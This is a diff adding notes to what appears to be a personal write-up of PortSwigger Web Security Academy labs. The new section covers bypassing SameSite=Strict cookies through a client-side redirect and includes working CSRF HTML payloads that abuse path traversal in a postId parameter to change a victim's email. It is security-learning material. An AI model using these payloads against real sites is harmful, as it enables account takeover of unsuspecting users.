@@ -24,3 +24,21 @@
     document.location = "https://0ac3000203ca9b4add16983800c00022.web-security-academy.net/my-account/change-email?email=pwnedo@web-security-academy.net&_method=POST";
     </script>
     ```
+
+- Samesite strict bypass via client-side redirect
+After posting a comment, you are briefly redirect to a page /post/comment/confirmation?postId=7. The redirect is handled client-side by the javascript file /resources/js/commentConfirmationRedirect.js:
+```
+redirectOnConfirmation = (blogPath) => {
+    setTimeout(() => {
+        const url = new URL(window.location);
+        const postId = url.searchParams.get("postId");
+        window.location = blogPath + '/' + postId;
+    }, 3000);
+}
+```
+The postId is directly used to construct the redirection path, which canm be exploited with path traversal. We exploit this redirect path traversal to access the strict session cookie to change the email.
+```
+<script>
+    document.location = "https://0afe00bd04a2155a81a117a3004f0014.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email/?email=evil%40hacker.net%26submit=1"
+</script>
+```
